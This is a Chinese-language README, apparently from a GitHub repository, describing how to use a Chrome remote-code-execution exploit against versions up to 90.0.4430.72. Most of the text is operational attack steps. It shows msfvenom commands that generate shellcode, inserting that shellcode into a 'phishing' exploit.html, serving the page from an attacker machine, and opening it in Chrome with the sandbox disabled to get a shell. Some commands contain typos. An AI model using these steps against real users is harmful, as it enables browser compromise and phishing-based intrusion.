# chrome-0day
## 影响范围

目前最新版也受影响
小于等于90.0.4430.72 (正式版本)

## 利用过程

### 生成shellcode代码

#### 弹出计算器的shellcode生成命令：

**64位操作系统：**

```
msfvenom -a x64 -p windows/x64/exec CMD="calc" EXITFUNC=thread -f num
```

**32位操作系统：**

```
msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num
```

*（当然也可以换成其他系统命令，注意这里的架构要和浏览器所在操作系统的保持一致，一般为64位）*

### 制作html钓鱼文件


将生成的代码放入explo.html中shellcode[]中。

#### 方式一

浏览器关闭沙盒并打开网页

```
chrome.exe --no-sanbox /path/to/exploit.html
```
![image](https://user-images.githubusercontent.com/41281045/115233705-d0f06780-a14a-11eb-9f2e-ebf6e785b46f.png)

#### 方式二

在攻击机当前目录下用python或kali自带的apache2开启一个http服务。

python3.x版本：

```
python3 -m http.server 80
```

python2.x版本：

```
python -m SimpleHttpServer 80
```

apache2

```
sudo systemctl start apache2
```

http://192.168.43.232/exploit.html

![image](https://user-images.githubusercontent.com/41281045/115233623-b7e7b680-a14a-11eb-9fd0-49665bf58653.png)



然后记得关闭沙盒后打开使用Chrome浏览器访问exploit.html即可成功反弹shell。



### 关闭沙盒方法：

**命令方式：**

chrome.exe --no-sandbox

**手动方式：**

在快捷方式属性中目标后面添加" --no-sandbox",

![image](https://user-images.githubusercontent.com/41281045/115229381-90421f80-a145-11eb-97ad-04f84bcd1784.png)



















